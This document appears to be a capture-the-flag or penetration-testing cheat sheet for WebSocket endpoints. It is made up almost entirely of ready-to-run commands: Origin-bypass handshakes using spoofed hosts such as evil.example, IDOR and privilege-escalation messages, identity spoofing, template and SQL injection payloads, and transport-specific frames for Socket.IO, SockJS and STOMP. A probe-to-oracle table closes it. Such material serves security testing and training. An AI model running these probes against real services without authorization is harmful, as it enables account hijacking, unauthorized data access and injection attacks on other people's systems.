# Probe catalogue — every probe, indexed

## The handshake probes

```bash
# the baseline
python3 tools/web/ws_probe.py "$WS/ws" --message '{}'
# the foreign Origin
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'
# the Origin bypass set
python3 tools/web/ws_probe.py "$WS/ws" --origin 'null' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'file://' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://target.evil.com' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://sub.target.com' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://target.com.evil.com' --message '{}'
# the binding
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Authorization: Bearer x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws?token=eyJ" --message '{"action":"me"}'
# the no-auth open
python3 tools/web/ws_probe.py "$WS/ws" --message '{"action":"me"}'
# the sub-protocol
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: graphql-ws' --message '{}'
# the SameSite read
curl -sI "$BASE/login" | grep -i 'set-cookie'
```

## The message probes — per mechanism

```bash
# idor
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"read","id":"victim"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"open","doc":"admin-doc"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"history","room":"admin-dm"}'
# membership
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"join","room":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"subscribe","channel":"internal"}'
# action
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"debug"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"eval","code":"x"}'
# spoof
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"from":"victim","action":"flag"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"x","role":"admin"}'
# inject
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"q":"{{7*7}}"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"q":"'"'"' OR 1=1--"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"file":"/flag"}'
# subscription
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"type":"subscribe","payload":{"query":"subscription{...}"}}'
# resumption
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"session_id":"<other>"}'
```

## The transport-specific probes

```bash
# Socket.IO
python3 tools/web/ws_probe.py "$WS/socket.io/?EIO=4&transport=websocket" --message '42["admin",{}]'
# SockJS — a["{...}"]
python3 tools/web/ws_probe.py "$WS/sockjs/<srv>/<sess>/websocket" --message 'a["{\"action\":\"x\"}"]'
# STOMP
python3 tools/web/ws_probe.py "$WS/stomp" --headers 'Sec-WebSocket-Protocol: v12.stomp' --message 'SEND destination:/app/x'
# protobuf
python3 tools/proto_decode.py frame.bin
python3 tools/proto_decode.py --hex "0a0568656c6c6f"
```

## The probe-map

| Cell | The probe | The oracle |
|---|---|---|
| origin | `--origin <foreign>` | a `101` |
| binding | `Cookie:`/`Authorization:`/`?token=` | a bound identity |
| unauth | no credential | a data reply |
| idor | `{"action":"read","id":"<other>"}` | another's object |
| action | `{"action":"<privileged>"}` | a privileged reply |
| spoof | `{"from":"<other>",...}` | acts as the other |
| inject | `{"<field>":"<payload>"}` | the eval/read |
| subscribe | `{"action":"subscribe","channel":"<x>"}` | another's feed |
